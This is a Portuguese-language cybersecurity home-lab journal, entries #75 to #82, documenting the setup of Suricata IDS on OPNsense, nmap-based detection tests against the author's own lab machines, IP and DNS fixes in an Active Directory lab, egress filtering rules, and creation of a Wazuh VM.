Continuar o hardening do OPNsense começado na sessão anterior, desta vez introduzindo deteção de intrusão (IDS) através do Suricata, já integrado no sistema base do OPNsense 25.1 (deixou de ser um plugin à parte). Esta entrada documenta, de forma honesta, o processo de tentativa e erro até se conseguir descarregar as regras de deteção — nada disto foi direto à primeira.

### Ação executada / dificuldades encontradas
1. **Confusão inicial sobre onde encontrar o Suricata** — a expectativa era instalá-lo como plugin (`os-suricata`) em `Firmware → Plugins`, mas não aparecia na lista alfabética onde devia estar. Correção: nas versões recentes do OPNsense, o Suricata já vem incluído no sistema base, acessível diretamente em `Services → Intrusion Detection`.
2. **Configuração inicial (Enabled, Interfaces=LAN, IPS mode desligado) marcada mas nunca guardada** — a página `Settings` tinha as caixas certas marcadas visualmente, mas sem clicar em `Save`/`Apply` no fundo da página, nada ficou realmente ativo. Isto só foi percebido ao voltar à página mais tarde e ver tudo desmarcado outra vez.
3. **Botão "Download & Update Rules" a falhar silenciosamente** — ao clicar, a página mostrava uma animação de carregamento por 1-2 segundos e voltava ao estado inicial, sem qualquer mensagem de erro. Isto repetiu-se em várias tentativas.
4. **Hipótese testada e descartada: falta de internet no OPNsense** — chegou a suspeitar-se (com razão, dada a experiência da sessão anterior com o segundo NIC da "Servidor Vulneravel") que o próprio OPNsense tinha perdido acesso à internet. Verificação nas definições da VM (VMware) confirmou que a VM do OPNsense tinha mesmo apenas um adaptador de rede (LAN Segment), sem NAT/WAN — situação diferente da "Servidor Vulneravel", mas com o mesmo tipo de causa (uma placa de rede em falta a nível de VMware).
5. **Correção do adaptador em falta** — foi necessário desligar a VM do OPNsense por completo (o VMware recusa adicionar placas de rede a uma VM ligada, por falta de "slots" para hot-plug), adicionar um novo Network Adapter em modo NAT, e voltar a ligar a VM. Confirmado no ecrã de arranque: `WAN (em1) -> v4/DHCP4: 192.168.203.130/24`.
6. **Confirmação de conectividade a partir da consola** — `ping 8.8.8.8` (sucesso, 100%) e `ping google.com` (sucesso, resolve e responde) confirmaram rede e DNS a funcionar. No entanto, `ping rules.emergingthreats.net` deu 100% de perda — inicialmente ambíguo (pode ser DNS a falhar ou o servidor a bloquear ICMP).
7. **Log File do Suricata revelou a pista real** — mesmo depois de corrigir o adaptador e guardar as definições, o log mostrava repetidamente `[100599] <Warning> -- 1 rule files specified, but no rules were loaded!`, confirmando que o serviço estava mesmo a correr, mas o ficheiro de regras nunca tinha sido descarregado com sucesso pela GUI.
8. **Diagnóstico decisivo por linha de comandos** — em vez de continuar a confiar num botão da GUI que falhava em silêncio, usou-se a Shell da consola do OPNsense (opção 8) com `fetch -o /dev/null https://rules.emergingthreats.net/open/suricata-7.0.3/emerging.rules.tar.gz`. Este comando teve sucesso imediato (5458 kB em ~1 segundo), confirmando definitivamente que a rede, o DNS e o HTTPS funcionam bem — o problema está isolado ao mecanismo de download da GUI, não à ligação.
9. **Erro de digitação notado antes de premir Enter** — o comando `fetch` foi escrito manualmente (sem copy/paste possível na consola), e continha inicialmente `emerging.rules.tar.gaz` em vez de `.tar.gz`; foi identificado e corrigido antes de correr.

### Resultado
Ainda em curso — a rede e o acesso do OPNsense à internet estão confirmados a funcionar (via CLI). Falta ainda usar o comando equivalente do OPNsense (`configctl ids update`) para tentar reproduzir o mesmo sucesso pelo caminho "oficial" e perceber se o botão da GUI tinha mesmo um problema à parte, ou se as regras ficam agora corretamente carregadas.

### Deduções e raciocínio
Esta sequência de dificuldades ilustra bem um padrão que já vinha da sessão anterior: falhas silenciosas em interfaces gráficas (sem mensagem de erro) são muito mais difíceis de diagnosticar do que falhas em terminal, onde o resultado é imediato e explícito. O comando `fetch` por CLI resolveu em segundos uma dúvida que a GUI deixou em aberto durante várias tentativas. Também fica confirmado, pela segunda vez nesta Fase 5, que VMs podem perder adaptadores de rede de forma não intencional (desta vez no próprio OPNsense, não numa VM cliente) — vale a pena, de futuro, verificar sempre as definições de hardware da VM em VMware como primeiro passo de diagnóstico de rede, antes de assumir problemas de configuração dentro do sistema operativo.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "o OPNsense já vem com um IDS (Suricata) incluído, mas para descarregar as regras que ele usa para detetar ataques, o botão da interface gráfica falhava sem explicar porquê. Verificámos passo a passo — internet, DNS, adaptador de rede da própria firewall — e só quando testámos por linha de comandos é que confirmámos que a ligação estava bem e o problema era mesmo só daquele botão específico."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — esta entrada é sobre diagnóstico de infraestrutura, não sobre uma técnica de ataque. Boa prática geral: quando uma ação pela interface gráfica falha sem mensagem de erro, testar o mesmo objetivo por linha de comandos costuma revelar informação que a GUI esconde.

### Domínios relacionados
Não aplicável diretamente a domínios de certificação — esta entrada é sobre processo de diagnóstico de rede e infraestrutura de laboratório.

### Próximos passos
Correr `configctl ids update` na Shell do OPNsense e confirmar se as regras ficam corretamente carregadas (via Log File e via separador Rules). Depois, gerar tráfego de teste a partir do Kali (por exemplo, um scan nmap) para confirmar que o Suricata gera alertas reais.

---

## Entrada #76 — Causa raiz encontrada e Suricata (IDS) ativado com sucesso: 1160 regras carregadas
**Data/hora:** 2026-08-25
**Máquinas ligadas:** OPNsense, Kali Linux (SSH e browser)

### Objetivo / Propósito
Fechar a investigação iniciada na Entrada #75: encontrar a razão pela qual o OPNsense nunca conseguia carregar as regras do Suricata (nem pela GUI, nem pelo comando `configctl ids update`), e confirmar a ativação final do IDS.

### Ação executada / dificuldades encontradas
1. **Ativação do SSH no OPNsense** para continuar a investigação sem os problemas de teclado da consola local (símbolos como `|` e `\` mal mapeados nesse teclado específico, diferente do problema já visto no Windows 11). Duas dificuldades extra no processo: a opção "Permit password login" também estava desligada por defeito (o SSH só aceitava chave, negando a password), e o "Permit root user login" também teve de ser ativado explicitamente — ambos em `System → Settings → Administration → Secure Shell`.
2. **Confirmação da causa raiz via `config.xml`** — usando `grep -n "IDS" /conf/config.xml` e depois `sed -n` para ver a secção completa, confirmou-se que `<fileTags/>` estava vazio, ou seja, a seleção de rulesets nunca tinha sido gravada em nenhuma das tentativas anteriores (nem a manual, nem a "tudo numa sequência sem sair da página").
3. **Descoberta do passo em falta** — na página `Download`, as checkboxes de cada ruleset servem apenas para *selecionar* linhas; é necessário depois clicar no botão **"Enable selected"** (no topo da tabela) para essa seleção passar a "ativa" de facto (o que atualiza o `fileTags` na configuração). Este passo nunca tinha sido usado nas tentativas anteriores — íamos direto das checkboxes para "Download & Update Rules", que sozinho não tem nenhum ruleset ativo para descarregar.
4. **Confusão momentânea ao usar "Enable selected"** — depois de clicar, as checkboxes ficam automaticamente desmarcadas outra vez, o que pareceu inicialmente que nada tinha acontecido; a confirmação real está na coluna "Enabled" (que passa de X para visto), não no estado da checkbox de seleção.

### Resultado
Sucesso confirmado por várias vias independentes: o Log File deixou de mostrar "no rules were loaded" e passou a mostrar avisos sobre regras específicas reais (ex.: flowbit da sig 2035004); e o separador `Rules` mostra agora **1160 regras carregadas** (rulesets ET open/scan e ET open/attack-response), todas com Action "alert" e Enabled ativo.

### Deduções e raciocínio
A causa final não foi nenhuma das hipóteses mais "técnicas" que fomos testando por ordem (falta de internet, DNS, disco cheio, ficheiro de regras em falta) — essas eram todas hipóteses válidas de descartar sistematicamente, mas a causa real era um passo de interface subtil e fácil de saltar sem dar por isso. Isto reforça uma lição já vista nesta Fase 5 com o OPNsense (a armadilha da tag "any" no firewall): interfaces gráficas com passos de duas etapas (selecionar + confirmar/ativar) são uma fonte comum de erros silenciosos, porque a primeira etapa (marcar a checkbox) parece suficiente mas não é.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "para ativar regras no Suricata do OPNsense não basta marcar as caixas dos rulesets que queremos — é preciso depois clicar num botão separado ('Enable selected') para essa seleção ficar mesmo gravada. Sem isso, o botão de download corre sem ter nada para descarregar, e falha em silêncio sem explicar porquê."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é uma lição de usabilidade/processo. Boa prática geral: depois de qualquer ação de configuração em duas etapas (selecionar + aplicar), confirmar sempre o resultado numa vista independente (aqui, a coluna "Enabled" da tabela, ou o `config.xml` diretamente) em vez de assumir que a primeira etapa foi suficiente.

### Domínios relacionados
Introdução a conceitos de IDS/IPS (deteção de intrusão baseada em assinaturas) — relevante para Security+ e CEH, no domínio de deteção e monitorização de rede.

### Próximos passos
Gerar tráfego de teste a partir do Kali (nmap scan contra o Servidor Vulneravel ou outra VM do lab) para confirmar que o Suricata gera alertas reais visíveis no separador Alerts.

---

## Entrada #77 — Suricata confirmado a detetar tráfego real: teste com nmap e descoberta do IP dinâmico do Kali
**Data/hora:** 2026-08-25
**Máquinas ligadas:** OPNsense, Kali Linux

### Objetivo / Propósito
Gerar tráfego real de teste para confirmar que o Suricata (ativado na Entrada #76) deteta e regista alertas, fechando o ciclo de ativação do IDS nesta sessão.

### Ação executada / dificuldades encontradas
1. **Primeira tentativa: `nmap -sS -A 192.168.10.101` (Kali → Servidor Vulneravel)** — não gerou nenhum alerta (`Alerts` mostrava "no results found"), apesar de o scan ter corrido normalmente e de haver 1160 regras ativas.
2. **Diagnóstico do porquê** — o Kali e o Servidor Vulneravel estão no mesmo segmento de rede (LAN Segment "Ciber", 192.168.10.0/24), ligados ao mesmo switch virtual. Tráfego entre duas máquinas na mesma sub-rede não passa pelo OPNsense (não há routing envolvido), por isso o Suricata, que está a monitorizar a interface LAN do OPNsense, nunca chega a ver esse tráfego. É o mesmo princípio de um switch físico: só entrega tráfego unicast à porta de destino, não copia para todas as portas.
3. **Segunda tentativa, corrigida: `nmap -sS -A 192.168.10.254` (Kali → OPNsense diretamente)** — como o OPNsense é sempre o destino final deste tráfego, este chega mesmo à sua interface LAN e é inspecionado.
4. **Descoberta inesperada durante o scan**: o IP de origem registado nos alertas era `192.168.10.102`, não o IP fixo `192.168.10.10` que o Kali deveria ter segundo a topologia documentada do projeto. Confirmado com o utilizador que é sempre a mesma VM Kali original (não uma segunda VM) — o IP fixo deixou de estar configurado dentro da VM nalgum momento, e agora recebe IP por DHCP (correspondendo ao lease "vbox" já visto antes na lista do OPNsense). Fica como item pendente para corrigir numa sessão futura, sem urgência.

### Resultado
Sucesso — o separador `Alerts` do Suricata mostrou vários alertas reais gerados pelo scan: múltiplas entradas `ET SCAN Possible ...` (SID 2024364) e uma `ET ATTACK_RESPONSE FTP inaccessible directory access COM1`, todos com Interface `LAN`, Source `192.168.10.102` (Kali) e Destination `192.168.10.254` (OPNsense), em pelo menos duas páginas de resultados.

### Deduções e raciocínio
Esta entrada fecha com um conceito de rede fundamental, complementar ao que já tínhamos aprendido sobre routing na Fase 4/5: um IDS colocado "no router" só vê tráfego que atravessa esse router — tráfego lateral dentro da mesma sub-rede (entre duas VMs no mesmo switch) fica invisível a esse IDS. Isto é exatamente a razão pela qual, em redes empresariais reais, um IDS de rede é normalmente ligado a uma porta de espelho (SPAN/mirror) de um switch gerido, ou colocado num ponto onde o tráfego relevante seja forçado a passar por ele (por exemplo, entre sub-redes/VLANs diferentes) — caso contrário, teria "pontos cegos" enormes.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "um IDS ligado só à interface de um router não vê tráfego entre duas máquinas que estão na mesma rede local, porque esse tráfego nunca passa pelo router — só é encaminhado (routed) tráfego que muda de sub-rede. Para testar o IDS, tive de apontar o scan diretamente ao próprio router, porque aí o tráfego é obrigatoriamente visto por ele."

### Como nos podemos defender
Ligado ao conceito de defesa em profundidade: um único IDS de rede posicionado no gateway não é suficiente para detetar ataques laterais (entre máquinas da mesma rede interna) — só cobre tráfego que entra/sai da rede ou que atravessa o router. Para deteção de movimento lateral, seria necessário um IDS por segmento, uma porta de espelho no switch, ou um HIDS (deteção baseada no próprio host) — que é precisamente o que o Wazuh, o próximo bloco desta Fase 5, vai trazer.

### Domínios relacionados
IDS/IPS de rede, arquitetura de deteção, limitações de visibilidade em redes comutadas (switching vs. routing) — relevante para Security+ e CEH.

### Próximos passos
Corrigir o IP fixo do Kali (192.168.10.10) numa sessão futura, sem urgência. Continuar o restante hardening do OPNsense e/ou avançar para o bloco Wazuh (HIDS), que complementaria exatamente a limitação de visibilidade lateral identificada nesta entrada.

---

## Entrada #78 — Correção do IP fixo do Kali (192.168.10.10), resolvendo a discrepância encontrada na Entrada #77
**Data/hora:** 2026-08-25
**Máquinas ligadas:** Kali Linux

### Objetivo / Propósito
Corrigir a discrepância identificada na Entrada #77: o Kali estava a receber IP por DHCP (192.168.10.102) em vez de usar o IP fixo 192.168.10.10 definido na topologia do projeto.

### Ação executada / dificuldades encontradas
1. **Diagnóstico** — `ip a` revelou que a interface `eth0` tinha *dois* endereços IPv4 simultâneos: `192.168.1.50/24` (estático, sem a etiqueta "dynamic" — resquício de uma configuração antiga da rede de casa) e `192.168.10.102/24` (com a etiqueta "dynamic", atribuído por DHCP na rede do lab). O `nmcli device status` confirmou que o NetworkManager não gere esta interface ("não gerenciável"), pelo que a configuração vinha do ficheiro clássico `/etc/network/interfaces`.
2. **Correção** — editado `/etc/network/interfaces` (via `sudo nano`), substituindo o bloco estático antigo (`address 192.168.1.50`, `gateway 192.168.1.241`, `dns-nameservers 8.8.8.8`) pelos valores corretos da rede do lab: `address 192.168.10.10`, `netmask 255.255.255.0`, `gateway 192.168.10.254`, `dns-nameservers 192.168.10.254`.
3. **Aplicação** — `sudo systemctl restart networking` para recarregar a configuração sem reiniciar a VM.

### Resultado
Sucesso confirmado: `ip a` mostra agora apenas `192.168.10.10/24` na interface `eth0` (sem o endereço antigo nem o dinâmico), e `ping -c 3 192.168.10.254` teve 0% de perda. A topologia do lab está de novo alinhada com o documentado (Kali = 192.168.10.10 fixo).

### Deduções e raciocínio
A causa provável desta deriva: nalgum momento anterior o `/etc/network/interfaces` deve ter sido reposto ou nunca atualizado desde uma configuração de casa mais antiga, enquanto outro mecanismo (possivelmente o próprio processo de arranque a pedir DHCP como reserva) atribuiu um segundo endereço à mesma interface. Ter duas configurações de IP ativas na mesma interface é uma fonte silenciosa de comportamento inconsistente — vale a pena, de futuro, verificar `ip a` no Kali no início de cada sessão que dependa do seu IP fixo, tal como já se verifica a rede antes de outros exercícios.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "a interface de rede do Kali tinha uma configuração estática desatualizada (da rede de casa) e ainda por cima estava a receber um segundo IP por DHCP ao mesmo tempo — corrigi o ficheiro de configuração para usar só o IP fixo correto do lab e reiniciei o serviço de rede."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é uma correção de configuração de ambiente de laboratório.

### Domínios relacionados
Configuração de rede em Linux (IP estático vs. DHCP) — fundamentos relevantes para A+ Core1 e Security+.

### Próximos passos
Continuar o restante da Fase 5: alargar o egress filtering do OPNsense a mais VMs e/ou iniciar o bloco Wazuh (SIEM/HIDS).

## Entrada #79 — Conflito de IP descoberto e corrigido (Windows Server / Kali), e reforço com reservas estáticas DHCP
**Data/hora:** 2026-08-25
**Máquinas ligadas:** Windows Server, Windows 11, Ubuntu Desktop, OPNsense (via browser no Kali)

### Objetivo / Propósito
Antes de alargar o egress filtering do OPNsense a mais VMs (próximo passo da Fase 5), confirmar o IP atual de cada máquina-alvo (Windows Server, Windows 11, Ubuntu Desktop) — a lista de DHCP Leases não mostrava nenhuma entrada ativa para as duas primeiras.

### Ação executada / dificuldades encontradas
1. **Windows 11** — `ipconfig` revelou IP 192.168.10.100 (correspondia à lease "expired" vista antes; o Windows continuava a usá-lo mesmo sem renovação formal). Foi também visível um adaptador extra "cliente-wg" com IP 10.10.10.2, sem gateway — identificado como a interface virtual do túnel WireGuard, confirmando que o VPN já estava configurado numa fase anterior do projeto.
2. **Windows Server** — `ipconfig` revelou IP **192.168.10.10** — o mesmo IP fixo atribuído ao Kali na Entrada #78. Conflito de IP real entre duas VMs distintas. O campo Default Gateway estava também em branco.
3. **Diagnóstico** — `Get-NetIPAddress -InterfaceAlias "Ethernet0" -AddressFamily IPv4` confirmou `PrefixOrigin`/`SuffixOrigin: Manual`, ou seja, uma configuração estática definida manualmente (não vinda de DHCP). A origem é conhecida e está documentada: foi na Entrada #66 que o Windows Server recebeu o IP fixo 192.168.10.10 — na altura sem se reparar que esse é o endereço reservado ao Kali na topologia do projeto. O conflito só se tornou visível agora, quando o IP do Kali foi reposto para 192.168.10.10 na Entrada #78.
4. **Correção (PowerShell no Windows Server)** — `Remove-NetIPAddress`, seguido de `New-NetIPAddress -IPAddress 192.168.10.1 -PrefixLength 24 -DefaultGateway 192.168.10.254`, e `Set-DnsClientServerAddress -ServerAddresses 192.168.10.254`. O IP 192.168.10.1 foi escolhido por já constar como valor planeado na topologia original do projeto (e por se ter confirmado, entretanto, que não estava em uso por ninguém).
5. **Dificuldade à parte** — ao pedir confirmação do resultado, colou-se acidentalmente o bloco de texto inteiro da resposta anterior (incluindo os prompts `PS C:\Users\Administrator>`) de volta para dentro da consola real, em vez de apenas o comando pedido. Isto gerou uma cascata de erros, porque o PowerShell interpretou `PS` como o alias de `Get-Process`. Não houve impacto real — foi só "ruído" — mas serviu de lembrete para copiar sempre só a linha de comando, nunca o bloco com os prompts incluídos.
6. **Verificação** — o novo IP ficou em estado `AddressState: Preferred` (ou seja, a deteção de duplicados via ARP não encontrou mais ninguém a usar 192.168.10.1), e `ping 192.168.10.254` teve 0% de perda.
7. **Ubuntu Desktop** — `ip a` confirmou IP 192.168.10.20/24 (dinâmico) e revelou também uma interface `wg0` com IP 10.10.10.1/24 — o servidor WireGuard, complementando a descoberta do "cliente-wg" no Windows 11.
8. **Reforço com reservas estáticas DHCP** — no OPNsense (`Services → ISC DHCPv4 → Leases`), criada uma reserva estática para o Windows 11 (IP 192.168.10.100, MAC 00:0c:29:7c:50:c6 pré-preenchido automaticamente a partir da lease) via o botão "Add static mapping", seguido de "Apply changes". O Ubuntu Desktop já tinha uma reserva estática pré-existente (visível pelo estado "static" na lista de leases), pelo que não precisou de alteração.

### Resultado
As três VMs-alvo do próximo passo (extensão do egress filtering) têm agora IP fixo e estável, confirmado diretamente (não apenas assumido pela topologia documentada):
- Windows Server: 192.168.10.1 (estático, configurado na própria VM)
- Windows 11: 192.168.10.100 (reserva estática DHCP, criada agora)
- Ubuntu Desktop: 192.168.10.20 (reserva estática DHCP, já existente)

### Deduções e raciocínio
A topologia original do projeto já continha uma nota de incerteza sobre o IP do Windows Server ("a confirmar, pode conflituar com gateway") — a preocupação estava certa em espírito (risco de conflito), mas o conflito real acabou por ser com o Kali, não com o gateway. Isto reforça a lição já registada na Entrada #78: nunca assumir que a topologia documentada corresponde ao estado real de uma VM sem verificar diretamente — configurações manuais feitas em fases anteriores podem divergir silenciosamente do que está escrito, e só se descobrem ao testar. Optar por reservas estáticas DHCP (em vez de IP fixo configurado manualmente em cada VM) para as máquinas que já usam DHCP é também mais robusto a longo prazo: o IP fica garantido sem depender de configuração manual dentro do sistema operativo de cada VM.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "descobrimos que o Windows Server e o Kali estavam com o mesmo IP configurado por engano, o que causa problemas de rede imprevisíveis porque duas máquinas não podem partilhar o mesmo endereço numa rede. Corrigi o IP do Windows Server por linha de comandos e, para as outras máquinas que usam DHCP, criei reservas fixas no servidor DHCP do OPNsense para que o IP delas nunca mude."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo direto — é gestão de infraestrutura de rede. Mas há uma ligação relevante: a deteção de duplicados de IP que vimos em ação (o estado "Tentative" → "Preferred" do Windows, baseado em ARP) é o mesmo mecanismo de rede que técnicas maliciosas como ARP spoofing exploram — a rede confia, por defeito, em quem responde a um pedido ARP para determinado IP, sem autenticação.

### Domínios relacionados
Fundamentos de redes (IP estático vs. DHCP, deteção de endereços duplicados via ARP, reservas DHCP) — relevante para Network+ e Security+.

### Próximos passos
Criar as regras de firewall (pass + block) no OPNsense para Windows Server, Windows 11 e Ubuntu Desktop, seguindo o padrão já validado no Servidor Vulnerável.

## Entrada #80 — Egress filtering alargado a Windows Server, Windows 11 e Ubuntu Desktop
**Data/hora:** 2026-08-25
**Máquinas ligadas:** Windows Server, Windows 11, Ubuntu Desktop, OPNsense (via browser no Kali)

### Objetivo / Propósito
Alargar o egress filtering do OPNsense — já aplicado ao Servidor Vulnerável na Entrada #72 — às restantes VMs do lab que não precisam de acesso à internet: Windows Server, Windows 11 e Ubuntu Desktop. O Kali foi deliberadamente excluído, por ser a máquina atacante e precisar de internet para atualizar ferramentas.

### Ação executada / dificuldades encontradas
1. Para cada uma das três VMs, criado o mesmo par de regras em `Firewall → Rules → LAN`, replicando o padrão já validado no Servidor Vulnerável: uma regra **Pass** (Source = IP da VM, Destination = 192.168.10.0/24) seguida de uma regra **Block** (Source = IP da VM, Destination = any).
2. **Dificuldade recorrente** — todas as regras novas são acrescentadas por defeito ao fim da lista, depois das regras "Default allow LAN to any rule" / "Default allow LAN IPv6 to any rule". Como o OPNsense avalia as regras de cima para baixo e aplica a primeira que corresponder ("first match"), foi necessário arrastar manualmente cada regra nova para cima dessas regras "Default allow" — caso contrário, o bloqueio nunca seria avaliado, porque a regra "Default allow" (mais genérica e mal posicionada primeiro) já teria deixado passar o tráfego antes de chegar à regra de bloqueio.
3. Alterações aplicadas ("Apply changes") após cada par de regras.
4. Teste de confirmação em cada VM, por linha de comandos: ping à rede do lab (gateway 192.168.10.254) e ping a um IP da internet (8.8.8.8).

### Resultado
As três VMs mantêm acesso total à rede interna do lab e ficam completamente bloqueadas para a internet:
- **Windows Server**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda
- **Windows 11**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda
- **Ubuntu Desktop**: 192.168.10.254 → 0% perda; 8.8.8.8 → 100% perda

Com isto, apenas o Kali mantém acesso à internet no segmento "Ciber" — todas as restantes VMs do lab estão agora isoladas da rede externa, só comunicando dentro do laboratório.

### Deduções e raciocínio
A ordem das regras de firewall (avaliação "first match", de cima para baixo) foi o ponto central desta sessão de trabalho: uma regra tecnicamente correta mas mal posicionada é, na prática, uma regra que nunca chega a ser avaliada. Isto generaliza a lição já registada na Entrada #72 e reforça-a com repetição — qualquer firewall baseado em listas ordenadas de regras (não é uma particularidade do OPNsense) tem este comportamento. Vale a pena manter o hábito de verificar sempre a posição final de uma regra na lista, não só o conteúdo dela.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "criámos duas regras de firewall para cada máquina: uma que permite tráfego dentro da rede do laboratório e outra que bloqueia tudo o resto, incluindo a internet. A ordem das regras é crítica — se a regra de bloqueio ficar posicionada depois de uma regra que já permite tudo, nunca chega a ser aplicada. Confirmei com testes de ping que cada máquina continua a comunicar dentro do lab mas não consegue sair para a internet."

### Como nos podemos defender
Isto é, em si, uma técnica defensiva: segmentação de rede aplicada segundo o princípio do menor privilégio — máquinas que não precisam de acesso à internet não o têm, o que reduz a superfície de ataque (por exemplo, exfiltração de dados ou comunicação com um servidor de comando e controlo) mesmo que uma dessas máquinas venha a ser comprometida.

### Domínios relacionados
Segurança de rede, firewalls, segmentação de rede, princípio do menor privilégio — relevante para Security+ e Network+.

### Próximos passos
A Fase 5 fica agora apenas com o bloco Wazuh (SIEM/HIDS) por concluir, reservado para uma sessão futura por pedido explícito. Sessão pausada aqui.

## Entrada #81 — Verificação pós-mudança de IP do Controlador de Domínio: domínio Active Directory confirmado saudável
**Data/hora:** 2026-08-25
**Máquinas ligadas:** Windows Server, Windows 11

### Objetivo / Propósito
Verificar e corrigir o impacto da mudança de IP do Controlador de Domínio (192.168.10.10 → 192.168.10.1, Entrada #79) na saúde do domínio Active Directory — ponto sinalizado como pendente na revisão geral pré-publicação e deixado propositadamente para uma sessão com as VMs ligadas.

### Ação executada / dificuldades encontradas
1. **Windows 11** — `ipconfig /all` confirmou que o DNS Servers ainda apontava para `192.168.10.10` — o IP antigo do Controlador de Domínio, agora ocupado pelo Kali. Era um resquício da configuração feita na Entrada #71, nunca atualizado depois da mudança de IP do DC na Entrada #79.
2. Corrigido com `Set-DnsClientServerAddress -InterfaceAlias "Ethernet 3" -ServerAddresses 192.168.10.1`. Confirmado com `Resolve-DnsName lab.local` → devolveu corretamente `192.168.10.1`.
3. **Windows Server (DC)** — confirmado IP correto (`192.168.10.1`) e DNS a apontar para si mesmo (`::1`). Corrido `ipconfig /registerdns` por precaução, para forçar a atualização dos próprios registos.
4. Verificado o conteúdo da zona DNS com `Get-DnsServerResourceRecord -ZoneName lab.local -RRType A`: todos os registos corretos, sem nenhuma referência residual ao IP antigo — tanto o registo do próprio DC (`win-54obk8b48l5`) como o do Windows 11 (`DESKTOP-78KHHRF`) já estavam com os IPs atuais, sem intervenção manual necessária do lado do servidor.
5. **Teste final de ponta a ponta**, no Windows 11: `nltest /dsgetdc:lab.local` — localizou o Controlador de Domínio corretamente em `192.168.10.1`, com todas as flags esperadas de um DC saudável (`PDC GC DS LDAP KDC ... WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST`), terminando com "The command completed successfully".

### Resultado
Domínio Active Directory confirmado saudável após a mudança de IP do Controlador de Domínio. O único ponto que precisava de correção manual era o DNS do cliente Windows 11; a zona DNS do próprio servidor já estava correta e sem registos antigos.

### Deduções e raciocínio
Isto confirma na prática uma preocupação levantada em teoria durante a revisão geral: mudar o IP de um serviço central (aqui, o Controlador de Domínio) tem efeitos em cascata que não se corrigem sozinhos em todos os pontos da rede. O próprio servidor tratou de se corrigir (a zona DNS já estava limpa), mas o cliente que dependia desse IP para encontrar o domínio ficou preso à configuração antiga até ser corrigido manualmente. Lição geral, transferível para qualquer infraestrutura de identidade centralizada: mudar o endereço de um serviço deste tipo obriga a auditar todos os consumidores desse serviço, não só o serviço em si — um domínio "aparentemente saudável" do lado do servidor pode estar invisível para clientes com configuração desatualizada.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "quando mudámos o IP do Controlador de Domínio, o Windows 11 continuou a tentar encontrá-lo no IP antigo, porque tinha o DNS configurado manualmente para esse valor. Corrigi o DNS do cliente para o IP novo e confirmei, com o comando `nltest`, que o Windows 11 agora encontra e comunica corretamente com o Controlador de Domínio."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é manutenção de infraestrutura. Lição transferível: mudanças de IP em serviços centrais (DNS, Controladores de Domínio, etc.) devem ser sempre seguidas de uma auditoria a todos os clientes que dependem desse endereço, não só ao próprio serviço.

### Domínios relacionados
Active Directory, DNS, resolução de nomes, dependências de infraestrutura — Security+ D3 (Arquitetura de Segurança), A+ Core 1 D2 (Redes).

### Próximos passos
Domínio confirmado saudável — não há mais nada pendente antes do Wazuh. A Fase 5 fica agora só com o bloco Wazuh (SIEM/HIDS) por fazer.

> **Ponto por confirmar (coerência com a Entrada #79):** a Entrada #79 (passo 4) regista, no próprio Windows Server, o comando `Set-DnsClientServerAddress -ServerAddresses 192.168.10.254`, mas nesta entrada (passo 3) o DNS do DC aparece a apontar para si mesmo (`::1`), sem um passo intermédio documentado a explicar a diferença. A hipótese mais provável — ainda **por confirmar diretamente na VM** — é que os dois valores coexistam por serem famílias de endereço diferentes (`::1` = DNS IPv6, o próprio DC; `192.168.10.254` = DNS IPv4). Fica assinalado para verificar com um `ipconfig /all` completo antes de dar o ponto por encerrado.

## Entrada #82 — Fase 5 (Wazuh): VM dedicada criada e Ubuntu Server 24.04 instalado

**Máquinas ligadas:** OPNsense, nova VM "Wazuh" (Ubuntu Server 24.04)

**Objetivo:** Criar a VM dedicada para o Wazuh (SIEM/HIDS), última peça em falta da Fase 5, seguindo a decisão de arquitetura tomada previamente: VM nova e isolada (nunca partilhar a VM do SIEM com o alvo monitorizado), instalação manual/nativa (não Docker), Ubuntu Server 24.04 LTS, ≥4GB RAM / 2 vCPUs / 50GB disco, LAN segment "Ciber", IP fixo previsto 192.168.10.30.

**Ação executada:**
1. Criação da VM no VMware Workstation via *Custom (advanced)*, com 2 vCPUs (1 processador, 2 cores), 4GB RAM, disco de 50GB (thin provisioning, single file), controlador LSI Logic (recomendado).
2. Rede: sem opção de "LAN segment" disponível no assistente inicial — VM criada sem adaptador de rede ("Do not use a network connection") e adicionada depois manualmente via VM Settings → Add → Network Adapter → LAN segment "Ciber".
3. Instalação do Ubuntu Server 24.04 (imagem `24.04.1`) em modo texto (TUI do subiquity), sem "Easy Install", para acompanhar cada passo: tipo de instalação "Ubuntu Server" (não minimized), rede por DHCP (temporário, para instalação), sem proxy, mirror padrão, sem atualização do instalador, sem snaps adicionais, com OpenSSH server instalado.
4. Particionamento: LVM guiado, mas por defeito o instalador só atribuiu ~24GB à partição `/`, deixando os outros ~24GB como espaço livre não atribuído dentro do grupo de volumes — corrigido editando o volume lógico `ubuntu-lv` para usar o disco completo (~48GB).
5. Instalação concluída, reboot, primeiro login confirmado com sucesso (utilizador `pedro`, IP DHCP atribuído: 192.168.10.103).

**Resultado:** VM "Wazuh" criada e operacional, Ubuntu Server 24.04 LTS instalado e acessível. Sessão pausada aqui, a pedido do utilizador, antes de configurar o IP fixo (192.168.10.30) e antes de começar a instalação do próprio Wazuh.

**Deduções e raciocínio:**
- **Falha minha, registada com honestidade:** antes de criar a VM, o utilizador desligou as máquinas do lab que não eram necessárias para esta tarefa. Eu não avisei que o OPNsense (gateway/DHCP/DNS de toda a rede "Ciber") tinha de ficar ligado, e isso causou um pedido de DHCP pendurado durante a instalação (a VM ficou minutos à espera de um IP que nunca chegava, porque não havia servidor DHCP ativo). Resolvido assim que o OPNsense foi ligado. Lição: sempre que se desligam VMs "não necessárias", o gateway/DHCP da rede tem de ser tratado como excepção óbvia, e eu devia ter sinalizado isso proativamente.
- O comportamento do instalador do Ubuntu de reservar só metade do disco por defeito no LVM guiado (em vez de usar tudo) é uma mudança relativamente recente do subiquity — vale a pena confirmar sempre o resumo antes de avançar, em vez de assumir que "guided" significa "usa tudo".
